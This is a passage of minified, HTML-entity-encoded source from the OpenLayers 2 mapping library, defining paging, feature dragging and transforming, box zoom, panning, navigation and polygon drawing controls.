a&#125;,cacheFeatures:function(a)&#123;this.paging||(this.clearCache(),this.features=a.features,this.pageNext(a))&#125;,clearCache:function()&#123;if(this.features)for(var a=0;a&lt;this.features.length;++a)this.features[a].destroy();this.num=this.features=null&#125;,pageCount:function()&#123;return Math.ceil((this.features?this.features.length:0)/this.length)&#125;,pageNum:function()&#123;return this.num&#125;,pageLength:function(a)&#123;a&amp;&amp;0&lt;a&amp;&amp;(this.length=a);return this.length&#125;,pageNext:function(a)&#123;var b=!1;this.features&amp;&amp;(null===this.num&amp;&amp;(this.num=-1),b=this.page((this.num+1)*this.length,a));return b&#125;,pagePrevious:function()&#123;var a=!1;this.features&amp;&amp;(null===this.num&amp;&amp;(this.num=this.pageCount()),a=this.page((this.num-1)*this.length));return a&#125;,page:function(a,b)&#123;var c=!1;if(this.features&amp;&amp;0&lt;=a&amp;&amp;a&lt;this.features.length)&#123;var d=Math.floor(a/this.length);d!=this.num&amp;&amp;(this.paging=!0,c=this.features.slice(a,a+this.length),this.layer.removeFeatures(this.layer.features),this.num=d,b&amp;&amp;b.features?b.features=c:this.layer.addFeatures(c),this.paging=!1,c=!0)&#125;return c&#125;,CLASS_NAME:"OpenLayers.Strategy.Paging"&#125;);OpenLayers.Control.DragFeature=OpenLayers.Class(OpenLayers.Control,&#123;geometryTypes:null,onStart:function(a,b)&#123;&#125;,onDrag:function(a,b)&#123;&#125;,onComplete:function(a,b)&#123;&#125;,onEnter:function(a)&#123;&#125;,onLeave:function(a)&#123;&#125;,documentDrag:!1,layer:null,feature:null,dragCallbacks:&#123;&#125;,featureCallbacks:&#123;&#125;,lastPixel:null,initialize:function(a,b)&#123;OpenLayers.Control.prototype.initialize.apply(this,[b]);this.layer=a;this.handlers=&#123;drag:new OpenLayers.Handler.Drag(this,OpenLayers.Util.extend(&#123;down:this.downFeature,move:this.moveFeature,up:this.upFeature,out:this.cancel,done:this.doneDragging&#125;,this.dragCallbacks),&#123;documentDrag:this.documentDrag&#125;),feature:new OpenLayers.Handler.Feature(this,this.layer,OpenLayers.Util.extend(&#123;click:this.clickFeature,clickout:this.clickoutFeature,over:this.overFeature,out:this.outFeature&#125;,this.featureCallbacks),&#123;geometryTypes:this.geometryTypes&#125;)&#125;&#125;,clickFeature:function(a)&#123;this.handlers.feature.touch&amp;&amp;(!this.over&amp;&amp;this.overFeature(a))&amp;&amp;(this.handlers.drag.dragstart(this.handlers.feature.evt),this.handlers.drag.stopDown=!1)&#125;,clickoutFeature:function(a)&#123;this.handlers.feature.touch&amp;&amp;this.over&amp;&amp;(this.outFeature(a),this.handlers.drag.stopDown=!0)&#125;,destroy:function()&#123;this.layer=null;OpenLayers.Control.prototype.destroy.apply(this,[])&#125;,activate:function()&#123;return this.handlers.feature.activate()&amp;&amp;OpenLayers.Control.prototype.activate.apply(this,arguments)&#125;,deactivate:function()&#123;this.handlers.drag.deactivate();this.handlers.feature.deactivate();this.feature=null;this.dragging=!1;this.lastPixel=null;OpenLayers.Element.removeClass(this.map.viewPortDiv,this.displayClass+"Over");return OpenLayers.Control.prototype.deactivate.apply(this,arguments)&#125;,overFeature:function(a)&#123;var b=!1;this.handlers.drag.dragging?this.over=this.feature.id==a.id?!0:!1:(this.feature=a,this.handlers.drag.activate(),this.over=b=!0,OpenLayers.Element.addClass(this.map.viewPortDiv,this.displayClass+"Over"),this.onEnter(a));return b&#125;,downFeature:function(a)&#123;this.lastPixel=a;this.onStart(this.feature,a)&#125;,moveFeature:function(a)&#123;var b=this.map.getResolution();this.feature.geometry.move(b*(a.x-this.lastPixel.x),b*(this.lastPixel.y-a.y));this.layer.drawFeature(this.feature);this.lastPixel=a;this.onDrag(this.feature,a)&#125;,upFeature:function(a)&#123;this.over||this.handlers.drag.deactivate()&#125;,doneDragging:function(a)&#123;this.onComplete(this.feature,a)&#125;,outFeature:function(a)&#123;this.handlers.drag.dragging?this.feature.id==a.id&amp;&amp;(this.over=!1):(this.over=!1,this.handlers.drag.deactivate(),OpenLayers.Element.removeClass(this.map.viewPortDiv,this.displayClass+"Over"),this.onLeave(a),this.feature=null)&#125;,cancel:function()&#123;this.handlers.drag.deactivate();this.over=!1&#125;,setMap:function(a)&#123;this.handlers.drag.setMap(a);this.handlers.feature.setMap(a);OpenLayers.Control.prototype.setMap.apply(this,arguments)&#125;,CLASS_NAME:"OpenLayers.Control.DragFeature"&#125;);OpenLayers.Control.TransformFeature=OpenLayers.Class(OpenLayers.Control,&#123;geometryTypes:null,layer:null,preserveAspectRatio:!1,rotate:!0,feature:null,renderIntent:"temporary",rotationHandleSymbolizer:null,box:null,center:null,scale:1,ratio:1,rotation:0,handles:null,rotationHandles:null,dragControl:null,irregular:!1,initialize:function(a,b)&#123;OpenLayers.Control.prototype.initialize.apply(this,[b]);this.layer=a;this.rotationHandleSymbolizer||(this.rotationHandleSymbolizer=&#123;stroke:!1,pointRadius:10,fillOpacity:0,cursor:"pointer"&#125;);this.createBox();this.createControl()&#125;,activate:function()&#123;var a=!1;OpenLayers.Control.prototype.activate.apply(this,arguments)&amp;&amp;(this.dragControl.activate(),this.layer.addFeatures([this.box]),this.rotate&amp;&amp;this.layer.addFeatures(this.rotationHandles),this.layer.addFeatures(this.handles),a=!0);return a&#125;,deactivate:function()&#123;var a=!1;OpenLayers.Control.prototype.deactivate.apply(this,arguments)&amp;&amp;(this.layer.removeFeatures(this.handles),this.rotate&amp;&amp;this.layer.removeFeatures(this.rotationHandles),this.layer.removeFeatures([this.box]),this.dragControl.deactivate(),a=!0);return a&#125;,setMap:function(a)&#123;this.dragControl.setMap(a);OpenLayers.Control.prototype.setMap.apply(this,arguments)&#125;,setFeature:function(a,b)&#123;b=OpenLayers.Util.applyDefaults(b,&#123;rotation:0,scale:1,ratio:1&#125;);var c=this.rotation,d=this.center;OpenLayers.Util.extend(this,b);if(!1!==this.events.triggerEvent("beforesetfeature",&#123;feature:a&#125;))&#123;this.feature=a;this.activate();this._setfeature=!0;var e=this.feature.geometry.getBounds();this.box.move(e.getCenterLonLat());this.box.geometry.rotate(-c,d);this._angle=0;this.rotation?(c=a.geometry.clone(),c.rotate(-this.rotation,this.center),c=new OpenLayers.Feature.Vector(c.getBounds().toGeometry()),c.geometry.rotate(this.rotation,this.center),this.box.geometry.rotate(this.rotation,this.center),this.box.move(c.geometry.getBounds().getCenterLonLat()),c=c.geometry.components[0].components[0].getBounds().getCenterLonLat()):c=new OpenLayers.LonLat(e.left,e.bottom);this.handles[0].move(c);delete this._setfeature;this.events.triggerEvent("setfeature",&#123;feature:a&#125;)&#125;&#125;,unsetFeature:function()&#123;this.active?this.deactivate():(this.feature=null,this.rotation=0,this.ratio=this.scale=1)&#125;,createBox:function()&#123;var a=this;this.center=new OpenLayers.Geometry.Point(0,0);this.box=new OpenLayers.Feature.Vector(new OpenLayers.Geometry.LineString([new OpenLayers.Geometry.Point(-1,-1),new OpenLayers.Geometry.Point(0,-1),new OpenLayers.Geometry.Point(1,-1),new OpenLayers.Geometry.Point(1,0),new OpenLayers.Geometry.Point(1,1),new OpenLayers.Geometry.Point(0,1),new OpenLayers.Geometry.Point(-1,1),new OpenLayers.Geometry.Point(-1,0),new OpenLayers.Geometry.Point(-1,-1)]),null,"string"==typeof this.renderIntent?null:this.renderIntent);this.box.geometry.move=function(b,c)&#123;a._moving=!0;OpenLayers.Geometry.LineString.prototype.move.apply(this,arguments);a.center.move(b,c);delete a._moving&#125;;for(var b=function(a,b)&#123;OpenLayers.Geometry.Point.prototype.move.apply(this,arguments);this._rotationHandle&amp;&amp;this._rotationHandle.geometry.move(a,b);this._handle.geometry.move(a,b)&#125;,c=function(a,b,c)&#123;OpenLayers.Geometry.Point.prototype.resize.apply(this,arguments);this._rotationHandle&amp;&amp;this._rotationHandle.geometry.resize(a,b,c);this._handle.geometry.resize(a,b,c)&#125;,d=function(a,b)&#123;OpenLayers.Geometry.Point.prototype.rotate.apply(this,arguments);this._rotationHandle&amp;&amp;this._rotationHandle.geometry.rotate(a,b);this._handle.geometry.rotate(a,b)&#125;,e=function(b,c)&#123;var d=this.x,e=this.y;OpenLayers.Geometry.Point.prototype.move.call(this,b,c);if(!a._moving)&#123;var f=a.dragControl.handlers.drag.evt,g=!(!a._setfeature&amp;&amp;a.preserveAspectRatio)&amp;&amp;!(f&amp;&amp;f.shiftKey),h=new OpenLayers.Geometry.Point(d,e),f=a.center;this.rotate(-a.rotation,f);h.rotate(-a.rotation,f);var k=this.x-f.x,l=this.y-f.y,m=k-(this.x-h.x),n=l-(this.y-h.y);a.irregular&amp;&amp;!a._setfeature&amp;&amp;(k-=(this.x-h.x)/2,l-=(this.y-h.y)/2);this.x=d;this.y=e;h=1;g?(l=1E-5&gt;Math.abs(n)?1:l/n,h=(1E-5&gt;Math.abs(m)?1:k/m)/l):(m=Math.sqrt(m*m+n*n),l=Math.sqrt(k*k+l*l)/m);a._moving=!0;a.box.geometry.rotate(-a.rotation,f);delete a._moving;a.box.geometry.resize(l,f,h);a.box.geometry.rotate(a.rotation,f);a.transformFeature(&#123;scale:l,ratio:h&#125;);a.irregular&amp;&amp;!a._setfeature&amp;&amp;(k=f.clone(),k.x+=1E-5&gt;Math.abs(d-f.x)?0:this.x-d,k.y+=1E-5&gt;Math.abs(e-f.y)?0:this.y-e,a.box.geometry.move(this.x-d,this.y-e),a.transformFeature(&#123;center:k&#125;))&#125;&#125;,f=function(b,c)&#123;var d=this.x,e=this.y;OpenLayers.Geometry.Point.prototype.move.call(this,b,c);if(!a._moving)&#123;var f=a.dragControl.handlers.drag.evt,f=f&amp;&amp;f.shiftKey?45:1,g=a.center,h=this.x-g.x,k=this.y-g.y;this.x=d;this.y=e;d=Math.atan2(k-c,h-b);d=Math.atan2(k,h)-d;d*=180/Math.PI;a._angle=(a._angle+d)%360;d=a.rotation%f;if(Math.abs(a._angle)&gt;=f||0!==d)d=Math.round(a._angle/f)*f-d,a._angle=0,a.box.geometry.rotate(d,g),a.transformFeature(&#123;rotation:d&#125;)&#125;&#125;,g=Array(8),h=Array(4),k,l,m,n="sw s se e ne n nw w".split(" "),p=0;8&gt;p;++p)k=this.box.geometry.components[p],l=new OpenLayers.Feature.Vector(k.clone(),&#123;role:n[p]+"-resize"&#125;,"string"==typeof this.renderIntent?null:this.renderIntent),0==p%2&amp;&amp;(m=new OpenLayers.Feature.Vector(k.clone(),&#123;role:n[p]+"-rotate"&#125;,"string"==typeof this.rotationHandleSymbolizer?null:this.rotationHandleSymbolizer),m.geometry.move=f,k._rotationHandle=m,h[p/2]=m),k.move=b,k.resize=c,k.rotate=d,l.geometry.move=e,k._handle=l,g[p]=l;this.rotationHandles=h;this.handles=g&#125;,createControl:function()&#123;var a=this;this.dragControl=new OpenLayers.Control.DragFeature(this.layer,&#123;documentDrag:!0,moveFeature:function(b)&#123;this.feature===a.feature&amp;&amp;(this.feature=a.box);OpenLayers.Control.DragFeature.prototype.moveFeature.apply(this,arguments)&#125;,onDrag:function(b,c)&#123;b===a.box&amp;&amp;a.transformFeature(&#123;center:a.center&#125;)&#125;,onStart:function(b,c)&#123;var d=!a.geometryTypes||-1!==OpenLayers.Util.indexOf(a.geometryTypes,b.geometry.CLASS_NAME),e=OpenLayers.Util.indexOf(a.handles,b),e=e+OpenLayers.Util.indexOf(a.rotationHandles,b);b!==a.feature&amp;&amp;(b!==a.box&amp;&amp;-2==e&amp;&amp;d)&amp;&amp;a.setFeature(b)&#125;,onComplete:function(b,c)&#123;a.events.triggerEvent("transformcomplete",&#123;feature:a.feature&#125;)&#125;&#125;)&#125;,drawHandles:function()&#123;for(var a=this.layer,b=0;8&gt;b;++b)this.rotate&amp;&amp;0===b%2&amp;&amp;a.drawFeature(this.rotationHandles[b/2],this.rotationHandleSymbolizer),a.drawFeature(this.handles[b],this.renderIntent)&#125;,transformFeature:function(a)&#123;if(!this._setfeature)&#123;this.scale*=a.scale||1;this.ratio*=a.ratio||1;var b=this.rotation;this.rotation=(this.rotation+(a.rotation||0))%360;if(!1!==this.events.triggerEvent("beforetransform",a))&#123;var c=this.feature,d=c.geometry,e=this.center;d.rotate(-b,e);a.scale||a.ratio?d.resize(a.scale,e,a.ratio):a.center&amp;&amp;c.move(a.center.getBounds().getCenterLonLat());d.rotate(this.rotation,e);this.layer.drawFeature(c);c.toState(OpenLayers.State.UPDATE);this.events.triggerEvent("transform",a)&#125;&#125;this.layer.drawFeature(this.box,this.renderIntent);this.drawHandles()&#125;,destroy:function()&#123;for(var a,b=0;8&gt;b;++b)a=this.box.geometry.components[b],a._handle.destroy(),a._handle=null,a._rotationHandle&amp;&amp;a._rotationHandle.destroy(),a._rotationHandle=null;this.rotationHandles=this.rotationHandleSymbolizer=this.handles=this.feature=this.center=null;this.box.destroy();this.layer=this.box=null;this.dragControl.destroy();this.dragControl=null;OpenLayers.Control.prototype.destroy.apply(this,arguments)&#125;,CLASS_NAME:"OpenLayers.Control.TransformFeature"&#125;);OpenLayers.Handler.Box=OpenLayers.Class(OpenLayers.Handler,&#123;dragHandler:null,boxDivClassName:"olHandlerBoxZoomBox",boxOffsets:null,initialize:function(a,b,c)&#123;OpenLayers.Handler.prototype.initialize.apply(this,arguments);this.dragHandler=new OpenLayers.Handler.Drag(this,&#123;down:this.startBox,move:this.moveBox,out:this.removeBox,up:this.endBox&#125;,&#123;keyMask:this.keyMask&#125;)&#125;,destroy:function()&#123;OpenLayers.Handler.prototype.destroy.apply(this,arguments);this.dragHandler&amp;&amp;(this.dragHandler.destroy(),this.dragHandler=null)&#125;,setMap:function(a)&#123;OpenLayers.Handler.prototype.setMap.apply(this,arguments);this.dragHandler&amp;&amp;this.dragHandler.setMap(a)&#125;,startBox:function(a)&#123;this.callback("start",[]);this.zoomBox=OpenLayers.Util.createDiv("zoomBox",&#123;x:-9999,y:-9999&#125;);this.zoomBox.className=this.boxDivClassName;this.zoomBox.style.zIndex=this.map.Z_INDEX_BASE.Popup-1;this.map.viewPortDiv.appendChild(this.zoomBox);OpenLayers.Element.addClass(this.map.viewPortDiv,"olDrawBox")&#125;,moveBox:function(a)&#123;var b=this.dragHandler.start.x,c=this.dragHandler.start.y,d=Math.abs(b-a.x),e=Math.abs(c-a.y),f=this.getBoxOffsets();this.zoomBox.style.width=d+f.width+1+"px";this.zoomBox.style.height=e+f.height+1+"px";this.zoomBox.style.left=(a.x&lt;b?b-d-f.left:b-f.left)+"px";this.zoomBox.style.top=(a.y&lt;c?c-e-f.top:c-f.top)+"px"&#125;,endBox:function(a)&#123;var b;if(5&lt;Math.abs(this.dragHandler.start.x-a.x)||5&lt;Math.abs(this.dragHandler.start.y-a.y))&#123;var c=this.dragHandler.start;b=Math.min(c.y,a.y);var d=Math.max(c.y,a.y),e=Math.min(c.x,a.x);a=Math.max(c.x,a.x);b=new OpenLayers.Bounds(e,d,a,b)&#125;else b=this.dragHandler.start.clone();this.removeBox();this.callback("done",[b])&#125;,removeBox:function()&#123;this.map.viewPortDiv.removeChild(this.zoomBox);this.boxOffsets=this.zoomBox=null;OpenLayers.Element.removeClass(this.map.viewPortDiv,"olDrawBox")&#125;,activate:function()&#123;return OpenLayers.Handler.prototype.activate.apply(this,arguments)?(this.dragHandler.activate(),!0):!1&#125;,deactivate:function()&#123;return OpenLayers.Handler.prototype.deactivate.apply(this,arguments)?(this.dragHandler.deactivate()&amp;&amp;this.zoomBox&amp;&amp;this.removeBox(),!0):!1&#125;,getBoxOffsets:function()&#123;if(!this.boxOffsets)&#123;var a=document.createElement("div");a.style.position="absolute";a.style.border="1px solid black";a.style.width="3px";document.body.appendChild(a);var b=3==a.clientWidth;document.body.removeChild(a);var a=parseInt(OpenLayers.Element.getStyle(this.zoomBox,"border-left-width")),c=parseInt(OpenLayers.Element.getStyle(this.zoomBox,"border-right-width")),d=parseInt(OpenLayers.Element.getStyle(this.zoomBox,"border-top-width")),e=parseInt(OpenLayers.Element.getStyle(this.zoomBox,"border-bottom-width"));this.boxOffsets=&#123;left:a,right:c,top:d,bottom:e,width:!1===b?a+c:0,height:!1===b?d+e:0&#125;&#125;return this.boxOffsets&#125;,CLASS_NAME:"OpenLayers.Handler.Box"&#125;);OpenLayers.Control.ZoomBox=OpenLayers.Class(OpenLayers.Control,&#123;type:OpenLayers.Control.TYPE_TOOL,out:!1,keyMask:null,alwaysZoom:!1,zoomOnClick:!0,draw:function()&#123;this.handler=new OpenLayers.Handler.Box(this,&#123;done:this.zoomBox&#125;,&#123;keyMask:this.keyMask&#125;)&#125;,zoomBox:function(a)&#123;if(a instanceof OpenLayers.Bounds)&#123;var b,c=a.getCenterPixel();if(this.out)&#123;b=Math.min(this.map.size.h/(a.bottom-a.top),this.map.size.w/(a.right-a.left));var d=this.map.getExtent(),e=this.map.getLonLatFromPixel(c),f=e.lon-d.getWidth()/2*b;a=e.lon+d.getWidth()/2*b;var g=e.lat-d.getHeight()/2*b;b=e.lat+d.getHeight()/2*b;b=new OpenLayers.Bounds(f,g,a,b)&#125;else f=this.map.getLonLatFromPixel(&#123;x:a.left,y:a.bottom&#125;),a=this.map.getLonLatFromPixel(&#123;x:a.right,y:a.top&#125;),b=new OpenLayers.Bounds(f.lon,f.lat,a.lon,a.lat);f=this.map.getZoom();g=this.map.getSize();a=g.w/2;g=g.h/2;b=this.map.getZoomForExtent(b);d=this.map.getResolution();e=this.map.getResolutionForZoom(b);d==e?this.map.setCenter(this.map.getLonLatFromPixel(c)):this.map.zoomTo(b,&#123;x:(d*c.x-e*a)/(d-e),y:(d*c.y-e*g)/(d-e)&#125;);f==this.map.getZoom()&amp;&amp;!0==this.alwaysZoom&amp;&amp;this.map.zoomTo(f+(this.out?-1:1))&#125;else this.zoomOnClick&amp;&amp;(this.out?this.map.zoomTo(this.map.getZoom()-1,a):this.map.zoomTo(this.map.getZoom()+1,a))&#125;,CLASS_NAME:"OpenLayers.Control.ZoomBox"&#125;);OpenLayers.Control.DragPan=OpenLayers.Class(OpenLayers.Control,&#123;type:OpenLayers.Control.TYPE_TOOL,panned:!1,interval:0,documentDrag:!1,kinetic:null,enableKinetic:!0,kineticInterval:10,draw:function()&#123;if(this.enableKinetic&amp;&amp;OpenLayers.Kinetic)&#123;var a=&#123;interval:this.kineticInterval&#125;;"object"===typeof this.enableKinetic&amp;&amp;(a=OpenLayers.Util.extend(a,this.enableKinetic));this.kinetic=new OpenLayers.Kinetic(a)&#125;this.handler=new OpenLayers.Handler.Drag(this,&#123;move:this.panMap,done:this.panMapDone,down:this.panMapStart&#125;,&#123;interval:this.interval,documentDrag:this.documentDrag&#125;)&#125;,panMapStart:function()&#123;this.kinetic&amp;&amp;this.kinetic.begin()&#125;,panMap:function(a)&#123;this.kinetic&amp;&amp;this.kinetic.update(a);this.panned=!0;this.map.pan(this.handler.last.x-a.x,this.handler.last.y-a.y,&#123;dragging:!0,animate:!1&#125;)&#125;,panMapDone:function(a)&#123;if(this.panned)&#123;var b=null;this.kinetic&amp;&amp;(b=this.kinetic.end(a));this.map.pan(this.handler.last.x-a.x,this.handler.last.y-a.y,&#123;dragging:!!b,animate:!1&#125;);if(b)&#123;var c=this;this.kinetic.move(b,function(a,b,f)&#123;c.map.pan(a,b,&#123;dragging:!f,animate:!1&#125;)&#125;)&#125;this.panned=!1&#125;&#125;,CLASS_NAME:"OpenLayers.Control.DragPan"&#125;);OpenLayers.Control.Navigation=OpenLayers.Class(OpenLayers.Control,&#123;dragPan:null,dragPanOptions:null,pinchZoom:null,pinchZoomOptions:null,documentDrag:!1,zoomBox:null,zoomBoxEnabled:!0,zoomWheelEnabled:!0,mouseWheelOptions:null,handleRightClicks:!1,zoomBoxKeyMask:OpenLayers.Handler.MOD_SHIFT,autoActivate:!0,initialize:function(a)&#123;this.handlers=&#123;&#125;;OpenLayers.Control.prototype.initialize.apply(this,arguments)&#125;,destroy:function()&#123;this.deactivate();this.dragPan&amp;&amp;this.dragPan.destroy();this.dragPan=null;this.zoomBox&amp;&amp;this.zoomBox.destroy();this.zoomBox=null;this.pinchZoom&amp;&amp;this.pinchZoom.destroy();this.pinchZoom=null;OpenLayers.Control.prototype.destroy.apply(this,arguments)&#125;,activate:function()&#123;this.dragPan.activate();this.zoomWheelEnabled&amp;&amp;this.handlers.wheel.activate();this.handlers.click.activate();this.zoomBoxEnabled&amp;&amp;this.zoomBox.activate();this.pinchZoom&amp;&amp;this.pinchZoom.activate();return OpenLayers.Control.prototype.activate.apply(this,arguments)&#125;,deactivate:function()&#123;this.pinchZoom&amp;&amp;this.pinchZoom.deactivate();this.zoomBox.deactivate();this.dragPan.deactivate();this.handlers.click.deactivate();this.handlers.wheel.deactivate();return OpenLayers.Control.prototype.deactivate.apply(this,arguments)&#125;,draw:function()&#123;this.handleRightClicks&amp;&amp;(this.map.viewPortDiv.oncontextmenu=OpenLayers.Function.False);this.handlers.click=new OpenLayers.Handler.Click(this,&#123;click:this.defaultClick,dblclick:this.defaultDblClick,dblrightclick:this.defaultDblRightClick&#125;,&#123;"double":!0,stopDouble:!0&#125;);this.dragPan=new OpenLayers.Control.DragPan(OpenLayers.Util.extend(&#123;map:this.map,documentDrag:this.documentDrag&#125;,this.dragPanOptions));this.zoomBox=new OpenLayers.Control.ZoomBox(&#123;map:this.map,keyMask:this.zoomBoxKeyMask&#125;);this.dragPan.draw();this.zoomBox.draw();this.handlers.wheel=new OpenLayers.Handler.MouseWheel(this,&#123;up:this.wheelUp,down:this.wheelDown&#125;,OpenLayers.Util.extend(this.map.fractionalZoom?&#123;&#125;:&#123;cumulative:!1,interval:50,maxDelta:6&#125;,this.mouseWheelOptions));OpenLayers.Control.PinchZoom&amp;&amp;(this.pinchZoom=new OpenLayers.Control.PinchZoom(OpenLayers.Util.extend(&#123;map:this.map&#125;,this.pinchZoomOptions)))&#125;,defaultClick:function(a)&#123;a.lastTouches&amp;&amp;2==a.lastTouches.length&amp;&amp;this.map.zoomOut()&#125;,defaultDblClick:function(a)&#123;this.map.zoomTo(this.map.zoom+1,a.xy)&#125;,defaultDblRightClick:function(a)&#123;this.map.zoomTo(this.map.zoom-1,a.xy)&#125;,wheelChange:function(a,b)&#123;this.map.fractionalZoom||(b=Math.round(b));var c=this.map.getZoom(),d;d=Math.max(c+b,0);d=Math.min(d,this.map.getNumZoomLevels());d!==c&amp;&amp;this.map.zoomTo(d,a.xy)&#125;,wheelUp:function(a,b)&#123;this.wheelChange(a,b||1)&#125;,wheelDown:function(a,b)&#123;this.wheelChange(a,b||-1)&#125;,disableZoomBox:function()&#123;this.zoomBoxEnabled=!1;this.zoomBox.deactivate()&#125;,enableZoomBox:function()&#123;this.zoomBoxEnabled=!0;this.active&amp;&amp;this.zoomBox.activate()&#125;,disableZoomWheel:function()&#123;this.zoomWheelEnabled=!1;this.handlers.wheel.deactivate()&#125;,enableZoomWheel:function()&#123;this.zoomWheelEnabled=!0;this.active&amp;&amp;this.handlers.wheel.activate()&#125;,CLASS_NAME:"OpenLayers.Control.Navigation"&#125;);OpenLayers.Control.DrawFeature=OpenLayers.Class(OpenLayers.Control,&#123;layer:null,callbacks:null,multi:!1,featureAdded:function()&#123;&#125;,initialize:function(a,b,c)&#123;OpenLayers.Control.prototype.initialize.apply(this,[c]);this.callbacks=OpenLayers.Util.extend(&#123;done:this.drawFeature,modify:function(a,b)&#123;this.layer.events.triggerEvent("sketchmodified",&#123;vertex:a,feature:b&#125;)&#125;,create:function(a,b)&#123;this.layer.events.triggerEvent("sketchstarted",&#123;vertex:a,feature:b&#125;)&#125;&#125;,this.callbacks);this.layer=a;this.handlerOptions=this.handlerOptions||&#123;&#125;;this.handlerOptions.layerOptions=OpenLayers.Util.applyDefaults(this.handlerOptions.layerOptions,&#123;renderers:a.renderers,rendererOptions:a.rendererOptions&#125;);"multi"in this.handlerOptions||(this.handlerOptions.multi=this.multi);if(a=this.layer.styleMap&amp;&amp;this.layer.styleMap.styles.temporary)this.handlerOptions.layerOptions=OpenLayers.Util.applyDefaults(this.handlerOptions.layerOptions,&#123;styleMap:new OpenLayers.StyleMap(&#123;"default":a&#125;)&#125;);this.handler=new b(this,this.callbacks,this.handlerOptions)&#125;,drawFeature:function(a)&#123;a=new OpenLayers.Feature.Vector(a);!1!==this.layer.events.triggerEvent("sketchcomplete",&#123;feature:a&#125;)&amp;&amp;(a.state=OpenLayers.State.INSERT,this.layer.addFeatures([a]),this.featureAdded(a),this.events.triggerEvent("featureadded",&#123;feature:a&#125;))&#125;,insertXY:function(a,b)&#123;this.handler&amp;&amp;this.handler.line&amp;&amp;this.handler.insertXY(a,b)&#125;,insertDeltaXY:function(a,b)&#123;this.handler&amp;&amp;this.handler.line&amp;&amp;this.handler.insertDeltaXY(a,b)&#125;,insertDirectionLength:function(a,b)&#123;this.handler&amp;&amp;this.handler.line&amp;&amp;this.handler.insertDirectionLength(a,b)&#125;,insertDeflectionLength:function(a,b)&#123;this.handler&amp;&amp;this.handler.line&amp;&amp;this.handler.insertDeflectionLength(a,b)&#125;,undo:function()&#123;return this.handler.undo&amp;&amp;this.handler.undo()&#125;,redo:function()&#123;return this.handler.redo&amp;&amp;this.handler.redo()&#125;,finishSketch:function()&#123;this.handler.finishGeometry()&#125;,cancel:function()&#123;this.handler.cancel()&#125;,CLASS_NAME:"OpenLayers.Control.DrawFeature"&#125;);OpenLayers.Handler.Polygon=OpenLayers.Class(OpenLayers.Handler.Path,&#123;holeModifier:null,drawingHole:!1,polygon:null,createFeature:function(a)&#123;a=this.layer.getLonLatFromViewPortPx(a);a=new OpenLayers.Geometry.Point(a.lon,a.lat);this.point=new OpenLayers.Feature.Vector(a);this.line=new OpenLayers.Feature.Vector(new OpenLayers.Geometry.LinearRing([this.point.geometry]));this.polygon=new OpenLayers.Feature.Vector(new OpenLayers.Geometry.Polygon([this.line.geometry]));this.callback("create",[this.point.geometry,this.getSketch()]);this.point.geometry.clearBounds();this.layer.addFeatures([this.polygon,this.point],&#123;silent:!0&#125;)&#125;,addPoint:function(a)&#123;if(!this.drawingHole&amp;&amp;this.holeModifier&amp;&amp;this.evt&amp;&amp;this.evt[this.holeModifier])for(var b=this.point.geometry,c=this.control.layer.features,d,e=c.length-1;0&lt;=e;--e)if(d=c[e].geometry,(d instanceof OpenLayers.Geometry.Polygon||d instanceof OpenLayers.Geometry.MultiPolygon)&amp;&amp;d.intersects(b))&#123;b=c[e];this.control.layer.removeFeatures([b],&#123;silent:!0&#125;);this.control.layer.events.registerPriority("sketchcomplete",this,this.finalizeInteriorRing);this.control.layer.events.registerPriority("sketchmodified",this,this.enforceTopology);b.geometry.addComponent(this.line.geometry);this.polygon=b;this.drawingHole=!0;break&#125;OpenLayers.Handler.Path.prototype.addPoint.apply(this,arguments)&#125;,getCurrentPointIndex:function()&#123;return this.line.geometry.components.length-2&#125;,enforceTopology:function(a)&#123;a=a.vertex;var b=this.line.geometry.components;this.polygon.geometry.intersects(a)||(b=b[b.length-3],a.x=b.x,a.y=b.y)&#125;,finishGeometry:function()&#123;this.line.geometry.removeComponent(this.line.geometry.components[this.line.geometry.components.length-2]);this.removePoint();this.finalize()&#125;,finalizeInteriorRing:function()&#123;var a=this.line.geometry,b=0!==a.getArea();if(b)&#123;for(var c=this.polygon.geometry.components,d=c.length-2;0&lt;=d;--d)if(a.intersects(c[d]))&#123;b=!1;break&#125;if(b)a:for(d=c.length-2;0&lt;d;--d)for(var e=c[d].components,f=0,g=e.length;f&lt;g;++f)if(a.containsPoint(e[f]))&#123;b=!1;break a&#125;&#125;b?this.polygon.state!==OpenLayers.State.INSERT&amp;&amp;(this.polygon.state=OpenLayers.State.UPDATE):this.polygon.geometry.removeComponent(a);this.restoreFeature();return!1&#125;,cancel:function()&#123;this.drawingHole&amp;&amp;(this.polygon.geometry.removeComponent(this.line.geometry),this.restoreFeature(!0));return OpenLayers.Handler.Path.prototype.cancel.apply(this,arguments)&#125;,restoreFeature:function(a)&#123;this.control.layer.events.unregister("sketchcomplete",this,this.finalizeInteriorRing);this.control.layer.events.unregister("sketchmodified",this,this.enforceTopology);this.layer.removeFeatures([this.polygon],&#123;silent:!0&#125;);this.control.layer.addFeatures([this.polygon],&#123;silent:!0&#125;);this.drawingHole=!1;a||this.control.layer.events.triggerEvent("sketchcomplete",&#123;feature:this.polygon&#125;)&#125;,destroyFeature:function(a)&#123;OpenLayers.Handler.Path.prototype.destroyFeature.call(this,a);this.polygon=null&#125;,drawFeature:function()&#123;this.layer.drawFeature(this.polygon,this.style);this.layer.drawFeature(this.point,this.style)&#125;,getSketch:function()&#123;return this.polygon&#125;,getGeometry:function()&#123;var a=this.polygon&amp;&amp;this.polygon.geometry;a&amp;&amp;this.multi&amp;&amp;(a=new OpenLayers.Geometry.MultiPolygon([a]));return a&#125;,CLASS_NAME:"OpenLayers.Handler.Polygon"&#125;);OpenLayers.Control.EditingToolbar=OpenLayers.Class(OpenLayers.Control.Panel,&#123;citeCompliant:!1,initialize:function(a,b)&#123;OpenLayers.Control.Panel.prototype.initialize.apply(this,[b]);this.addControls([new OpenLayers.Control.Navigation]);var c=[new OpenLayers.Control.DrawFeature(a,OpenLayers.Handler.Point,&#123;displayClass:"olControlDrawFeaturePoint",handlerOptions:&#123;citeCompliant:this.citeCompliant&#125;&#125;),new OpenLayers.Control.DrawFeature(a,OpenLayers.Handler.Path,&#123;displayClass:"olControlDrawFeaturePath",handlerOptions:&#123;citeCompliant:this.citeCompliant&#125;&#125;),new OpenLayers.Control.DrawFeature(a,OpenLayers.Handler.Polygon,&#123;displayClass:"olControlDrawFeaturePolygon",handlerOptions:&#123;citeCompliant:this.citeCompliant&#125;&#125;)];this.addControls(c)&#125;,draw:function()&#123;var a=OpenLayers.Control.Panel.prototype.draw.apply(this,arguments);null===this.defaultControl&amp;&amp;(this.defaultControl=this.controls[0]);return 